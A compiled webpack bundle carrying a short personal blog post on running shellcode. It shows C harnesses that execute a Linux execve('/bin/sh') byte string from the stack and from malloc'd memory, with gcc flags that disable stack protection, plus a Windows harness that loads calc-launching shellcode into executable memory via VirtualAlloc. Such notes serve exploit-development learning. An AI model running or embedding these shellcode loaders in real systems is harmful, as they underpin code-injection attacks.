(window.webpackJsonp=window.webpackJsonp||[]).push([[9],{101:function(e,n,t){"use strict";t.d(n,"a",(function(){return s})),t.d(n,"b",(function(){return d}));var x=t(0),c=t.n(x);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function l(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var x=Object.getOwnPropertySymbols(e);n&&(x=x.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,x)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?l(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):l(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function a(e,n){if(null==e)return{};var t,x,c=function(e,n){if(null==e)return{};var t,x,c={},r=Object.keys(e);for(x=0;x<r.length;x++)t=r[x],n.indexOf(t)>=0||(c[t]=e[t]);return c}(e,n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(x=0;x<r.length;x++)t=r[x],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(c[t]=e[t])}return c}var i=c.a.createContext({}),b=function(e){var n=c.a.useContext(i),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},s=function(e){var n=b(e.components);return c.a.createElement(i.Provider,{value:n},e.children)},p={inlineCode:"code",wrapper:function(e){var n=e.children;return c.a.createElement(c.a.Fragment,{},n)}},u=c.a.forwardRef((function(e,n){var t=e.components,x=e.mdxType,r=e.originalType,l=e.parentName,i=a(e,["components","mdxType","originalType","parentName"]),s=b(t),u=x,d=s["".concat(l,".").concat(u)]||s[u]||p[u]||r;return t?c.a.createElement(d,o(o({ref:n},i),{},{components:t})):c.a.createElement(d,o({ref:n},i))}));function d(e,n){var t=arguments,x=n&&n.mdxType;if("string"==typeof e||x){var r=t.length,l=new Array(r);l[0]=u;var o={};for(var a in n)hasOwnProperty.call(n,a)&&(o[a]=n[a]);o.originalType=e,o.mdxType="string"==typeof e?e:x,l[1]=o;for(var i=2;i<r;i++)l[i]=t[i];return c.a.createElement.apply(null,l)}return c.a.createElement.apply(null,t)}u.displayName="MDXCreateElement"},61:function(e,n,t){"use strict";t.r(n),t.d(n,"frontMatter",(function(){return l})),t.d(n,"metadata",(function(){return o})),t.d(n,"rightToc",(function(){return a})),t.d(n,"default",(function(){return b}));var x=t(2),c=t(6),r=(t(0),t(101)),l={},o={permalink:"/rosh/blog/2020/07/06/shellcode",source:"@site/blog\\2020-07-06-shellcode.md",description:"https://stackoverflow.com/questions/2458819/how-to-allocate-an-executable-page-in-a-linux-kernel-module",date:"2020-07-06T00:00:00.000Z",tags:[],title:"shellcode",readingTime:.995,truncated:!1,nextItem:{title:"Spinning up Docker Infrastructure for Apache-Php-MySql",permalink:"/rosh/blog/2020/06/26/docker"}},a=[{value:"Shellcode in Linux",id:"shellcode-in-linux",children:[{value:"using stack",id:"using-stack",children:[]},{value:"using malloc",id:"using-malloc",children:[]}]},{value:"Shellcode in Windows",id:"shellcode-in-windows",children:[]}],i={rightToc:a};function b(e){var n=e.components,t=Object(c.a)(e,["components"]);return Object(r.b)("wrapper",Object(x.a)({},i,t,{components:n,mdxType:"MDXLayout"}),Object(r.b)("p",null,Object(r.b)("a",Object(x.a)({parentName:"p"},{href:"https://stackoverflow.com/questions/2458819/how-to-allocate-an-executable-page-in-a-linux-kernel-module"}),"https://stackoverflow.com/questions/2458819/how-to-allocate-an-executable-page-in-a-linux-kernel-module")),Object(r.b)("h2",{id:"shellcode-in-linux"},"Shellcode in Linux"),Object(r.b)("h3",{id:"using-stack"},"using stack"),Object(r.b)("p",null,"Refs :"),Object(r.b)("ul",null,Object(r.b)("li",{parentName:"ul"},Object(r.b)("a",Object(x.a)({parentName:"li"},{href:"https://gist.github.com/securitytube/5318838"}),"https://gist.github.com/securitytube/5318838"))),Object(r.b)("pre",null,Object(r.b)("code",Object(x.a)({parentName:"pre"},{className:"language-c"}),'#include<stdio.h>\n#include<string.h>\n\n\nunsigned char code[] = \\\n"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";\n\nvoid main()\n{\n\n  printf("Shellcode Length:  %d\\n", strlen(code));\n\n  int (*ret)() = (int(*)())code;\n\n  ret();\n\n}\n')),Object(r.b)("pre",null,Object(r.b)("code",Object(x.a)({parentName:"pre"},{className:"language-bash"}),"$ gcc shell.c -o shell -fno-stack-protector -z execstack -m32\n$ ./shell\n")),Object(r.b)("h3",{id:"using-malloc"},"using malloc"),Object(r.b)("pre",null,Object(r.b)("code",Object(x.a)({parentName:"pre"},{className:"language-c"}),'#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n\n\nunsigned char code[] = \\\n"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";\n\nvoid main()\n{\n  void* ptr; //base pointer\n\n  printf("Shellcode Length:  %zu\\n", strlen(code));\n\n  // Dynamically allocate memory using malloc() \n  ptr = (void*)malloc(sizeof(code)); \n  \n  /* Copies contents of str2 to sr1 */\n  memcpy (ptr, code, sizeof(code)); \n  //printf("string %s", ptr);\n\n  //int (*ret)() = (int(*)())code;\n  void (*ret)() = (void (*)())ptr; //initialize and typecast ptr\n  (*ret)();\n}\n')),Object(r.b)("pre",null,Object(r.b)("code",Object(x.a)({parentName:"pre"},{className:"language-bash"}),"$ gcc shell_malloc.c -o shell -z execstack -m32\n$ ./shell\n")),Object(r.b)("h2",{id:"shellcode-in-windows"},"Shellcode in Windows"),Object(r.b)("p",null,"This will open up calc.exe program\nRefs:"),Object(r.b)("ul",null,Object(r.b)("li",{parentName:"ul"},Object(r.b)("a",Object(x.a)({parentName:"li"},{href:"https://www.exploit-db.com/exploits/48116"}),"https://www.exploit-db.com/exploits/48116")),Object(r.b)("li",{parentName:"ul"},Object(r.b)("a",Object(x.a)({parentName:"li"},{href:"https://github.com/Arno0x/ShellcodeWrapper/blob/master/templates/encryptedShellcodeWrapper.cpp"}),"https://github.com/Arno0x/ShellcodeWrapper/blob/master/templates/encryptedShellcodeWrapper.cpp"))),Object(r.b)("pre",null,Object(r.b)("code",Object(x.a)({parentName:"pre"},{className:"language-c"}),'#include<windows.h>\n#include<stdio.h>\n\nchar code[] = \\\n    "\\x89\\xe5\\x83\\xec\\x20\\x31\\xdb\\x64\\x8b\\x5b\\x30\\x8b\\x5b\\x0c\\x8b\\x5b"\n    "\\x1c\\x8b\\x1b\\x8b\\x1b\\x8b\\x43\\x08\\x89\\x45\\xfc\\x8b\\x58\\x3c\\x01\\xc3"\n    "\\x8b\\x5b\\x78\\x01\\xc3\\x8b\\x7b\\x20\\x01\\xc7\\x89\\x7d\\xf8\\x8b\\x4b\\x24"\n    "\\x01\\xc1\\x89\\x4d\\xf4\\x8b\\x53\\x1c\\x01\\xc2\\x89\\x55\\xf0\\x8b\\x53\\x14"\n    "\\x89\\x55\\xec\\xeb\\x32\\x31\\xc0\\x8b\\x55\\xec\\x8b\\x7d\\xf8\\x8b\\x75\\x18"\n    "\\x31\\xc9\\xfc\\x8b\\x3c\\x87\\x03\\x7d\\xfc\\x66\\x83\\xc1\\x08\\xf3\\xa6\\x74"\n    "\\x05\\x40\\x39\\xd0\\x72\\xe4\\x8b\\x4d\\xf4\\x8b\\x55\\xf0\\x66\\x8b\\x04\\x41"\n    "\\x8b\\x04\\x82\\x03\\x45\\xfc\\xc3\\xba\\x78\\x78\\x65\\x63\\xc1\\xea\\x08\\x52"\n    "\\x68\\x57\\x69\\x6e\\x45\\x89\\x65\\x18\\xe8\\xb8\\xff\\xff\\xff\\x31\\xc9\\x51"\n    "\\x68\\x2e\\x65\\x78\\x65\\x68\\x63\\x61\\x6c\\x63\\x89\\xe3\\x41\\x51\\x53\\xff"\n    "\\xd0\\x31\\xc9\\xb9\\x01\\x65\\x73\\x73\\xc1\\xe9\\x08\\x51\\x68\\x50\\x72\\x6f"\n    "\\x63\\x68\\x45\\x78\\x69\\x74\\x89\\x65\\x18\\xe8\\x87\\xff\\xff\\xff\\x31\\xd2"\n    "\\x52\\xff\\xd0";\n\nint main(int argc, char **argv)\n{\n    // Allocating memory with EXECUTE writes\n    void *exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n    // Copying deciphered shellcode into memory as a function\n    memcpy(exec, code, sizeof code);\n\n    // Call the shellcode\n    ((void(*)())exec)();\n}\n')))}b.isMDXComponent=!0}}]);